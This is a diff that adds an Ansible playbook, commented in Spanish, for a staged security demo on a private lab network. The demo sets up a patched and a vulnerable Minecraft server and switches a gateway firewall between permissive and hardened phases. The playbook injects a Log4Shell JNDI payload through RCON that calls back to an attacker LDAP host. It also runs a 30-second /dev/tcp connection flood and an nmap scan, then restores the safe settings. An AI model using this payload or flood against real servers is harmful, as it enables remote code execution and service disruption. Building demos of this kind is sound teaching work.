@@ -1,0 +1,121 @@
+---
+# ============================================================
+# Demo orquestada con Ansible (nodo de control = blackwall).
+# Se corre ACTO POR ACTO con --tags para pausar y narrar.
+#
+#   ansible-playbook -i inventory.ini demo.yml --tags prep   -K
+#   ansible-playbook -i inventory.ini demo.yml --tags fase1  -K
+#   ansible-playbook -i inventory.ini demo.yml --tags scan
+#   ansible-playbook -i inventory.ini demo.yml --tags log4shell -K
+#   ansible-playbook -i inventory.ini demo.yml --tags fase2  -K
+#   ansible-playbook -i inventory.ini demo.yml --tags flood  -K
+#   ansible-playbook -i inventory.ini demo.yml --tags reset  -K
+#   (-K = pedir password de sudo)
+# ============================================================
+
+- name: "PREP — dejar los servidores listos"
+  hosts: server
+  become: true
+  tags: [prep]
+  tasks:
+    - name: Iniciar ambas instancias
+      ansible.builtin.systemd: { name: "{{ item }}", state: started }
+      loop: [mc-actualizado, mc-vulnerable]
+    - name: online-mode=false en ambas
+      ansible.builtin.lineinfile:
+        path: "/srv-proyecto-admin/{{ item }}/server.properties"
+        regexp: '^online-mode='
+        line: 'online-mode=false'
+      loop: [mc-actualizado, mc-vulnerable]
+    - name: Reiniciar instancias para aplicar online-mode
+      ansible.builtin.systemd: { name: "{{ item }}", state: restarted }
+      loop: [mc-actualizado, mc-vulnerable]
+    - name: Ruta del callback por el gateway
+      ansible.builtin.command: ip route replace 192.168.56.0/24 via 10.10.10.1
+    - name: Esperar RCON (25575 y 25576)
+      ansible.builtin.wait_for: { host: 10.10.10.10, port: "{{ item }}", timeout: 120 }
+      loop: [25575, 25576]
+    - name: Copiar helper RCON
+      ansible.builtin.copy: { src: files/rcon.py, dest: /tmp/rcon.py, mode: '0755' }
+    - name: Quitar whitelist en ambas
+      ansible.builtin.command: "python3 /tmp/rcon.py {{ item }} 'whitelist off'"
+      loop: [25575, 25576]
+    - ansible.builtin.debug: { msg: "PREP listo: 2 instancias arriba, online-mode=false, whitelist off, ruta puesta." }
+
+- name: "FASE 1 — firewall permisivo (vulnerable)"
+  hosts: gateway
+  become: true
+  tags: [fase1]
+  tasks:
+    - ansible.builtin.command: /root/gateway/aplicar-fase.sh fase1
+      register: r
+    - ansible.builtin.debug: { var: r.stdout_lines }
+
+- name: "FASE 2 — firewall endurecido (seguro)"
+  hosts: gateway
+  become: true
+  tags: [fase2]
+  tasks:
+    - ansible.builtin.command: /root/gateway/aplicar-fase.sh fase2
+      register: r
+    - ansible.builtin.debug: { var: r.stdout_lines }
+
+- name: "LOG4SHELL — inyectar callback en el server vulnerable"
+  hosts: server
+  become: true
+  tags: [log4shell]
+  tasks:
+    - name: Asegurar helper RCON
+      ansible.builtin.copy: { src: files/rcon.py, dest: /tmp/rcon.py, mode: '0755' }
+    - name: Inyectar payload Log4Shell (RCON al vulnerable 25576)
+      ansible.builtin.command:
+        argv:
+          - python3
+          - /tmp/rcon.py
+          - "25576"
+          - "say ${jndi:ldap://{{ atacante_ip }}:1389/x}"
+      register: r
+    - ansible.builtin.debug: { msg: "Payload enviado -> el server vulnerable intenta el callback a {{ atacante_ip }}:1389" }
+
+- name: "FLOOD — sobrecarga desde el atacante (blackwall)"
+  hosts: attacker
+  tags: [flood]
+  tasks:
+    - name: Ruta a la red privada via gateway
+      become: true
+      ansible.builtin.command: "ip route replace 10.10.10.0/24 via {{ gw_lan_ip }}"
+    - name: Flood 30s a puertos bloqueados
+      ansible.builtin.shell: |
+        end=$((SECONDS+30))
+        while [ $SECONDS -lt $end ]; do
+          for p in 25575 25576 25566 22 80 443 3306 8080; do
+            timeout 0.2 bash -c "echo > /dev/tcp/10.10.10.10/$p" 2>/dev/null &
+          done
+          sleep 0.05
+        done
+        wait; echo "flood terminado"
+      args: { executable: /bin/bash }
+
+- name: "SCAN — nmap al gateway (antes/despues)"
+  hosts: attacker
+  tags: [scan]
+  tasks:
+    - ansible.builtin.command: "nmap -Pn -sT -p 25565-25580 {{ gw_lan_ip }}"
+      register: r
+    - ansible.builtin.debug: { var: r.stdout_lines }
+
+- name: "RESET — restaurar estado seguro"
+  hosts: server
+  become: true
+  tags: [reset]
+  tasks:
+    - name: online-mode=true en ambas
+      ansible.builtin.lineinfile:
+        path: "/srv-proyecto-admin/{{ item }}/server.properties"
+        regexp: '^online-mode='
+        line: 'online-mode=true'
+      loop: [mc-actualizado, mc-vulnerable]
+    - name: Quitar ruta temporal del callback
+      ansible.builtin.command: ip route del 192.168.56.0/24 via 10.10.10.1
+      ignore_errors: true
+    - ansible.builtin.debug: { msg: "online-mode restaurado; reinicia los servers para aplicarlo." }
